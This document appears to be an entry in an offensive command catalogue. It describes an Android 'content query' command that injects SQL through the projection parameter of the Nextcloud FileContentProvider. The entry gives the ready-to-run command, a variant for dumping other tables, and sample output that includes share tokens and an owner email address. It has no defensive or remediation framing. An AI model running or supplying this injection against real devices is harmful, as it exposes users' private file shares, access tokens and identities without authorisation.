---
id: cmd-content-query-sqli-001
data: >-
  content query --uri content://org.nextcloud/file --projection "* from ocshares
  --"
tags:
  - sqli
  - android
type: command
output: null
executor: bash
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.007Z'
verified: false
validated: true
submitted: true
---
# content-query-sqli-injection

## Command

```bash
content query --uri content://org.nextcloud/file --projection "* from ocshares --"
```

## Description

Executes a content provider query on an Android device to inject SQL via the projection parameter, exploiting the Nextcloud FileContentProvider to dump data from the ocshares table in filelist.db.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--uri` | Specifies the content URI for the FileContentProvider | Yes |
| `--projection` | Defines the columns to query; used here for SQL injection payload | Yes |

## Examples

### Basic Usage

```bash
content query --uri content://org.nextcloud/file --projection "* from ocshares --"
```

### Advanced Usage

Adapt for other tables by changing the projection, e.g., "* from filelist --".

```bash
content query --uri content://org.nextcloud/file --projection "* from filelist --"
```

## Expected Output

Row data from ocshares table, e.g., _id=1, file_source=71580, item_source=71580, share_type=3, share_with=, path=/Nextcloud.mp4, permissions=1, shared_date=1544792454, expiration_date=0, token=rkNCkcYcbGEBDQN, shared_with_display_name=, is_directory=0, user_id=-1, id_remote_shared=9, owner_share=julien_contacts@cloud.local.yourosoft.com, is_password_protected=0, note=, hide_download=0.

## Related

- [[Related Procedure: Execute-SQL-Injection-Query-via-Content-Provider]]
